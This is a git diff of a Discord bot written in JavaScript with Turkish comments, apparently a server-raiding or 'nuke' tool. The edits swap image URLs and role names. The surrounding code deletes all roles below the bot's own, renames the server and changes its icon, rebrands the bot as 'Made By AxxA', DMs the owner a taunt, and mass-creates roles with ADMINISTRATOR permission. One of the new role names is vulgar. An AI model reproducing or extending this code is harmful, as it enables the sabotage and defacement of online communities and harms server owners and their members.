@@ -1249,10 +1249,10 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://cdn.discordapp.com/attachments/842122302351343626/868185516976255016/20210723_203859.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("AxxA"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_poLUaDJu_YJ2oxecg_eTbuRAjDPsdW3Jqg&usqp=CAU");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("AxxA Uğradı."); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://cdn.discordapp.com/attachments/842122302351343626/868185516976255016/20210723_203859.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setAvatar("https://static6.depositphotos.com/1163454/653/v/450/depositphotos_6535974-stock-illustration-scarecrow-background.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
     await client.user.setUsername("Made By AxxA");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan İleti.**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
@@ -1263,27 +1263,27 @@ client.on("message", async msg => {
   if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
-      name: "HACKED",
+      name: "Made",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
         msg.guild.createRole({
-      name: "HACKED",
+      name: "By",
       color: "C22F2F",
       permissions: ["ADMINISTRATOR"]
     });
             msg.guild.createRole({
-      name: "HACKED",
+      name: "AxxA",
       color: "E12020",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Sikiş",
       color: "FF0000",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "Her",
       color: "FF3E00",
       permissions: ["ADMINISTRATOR"]
     });
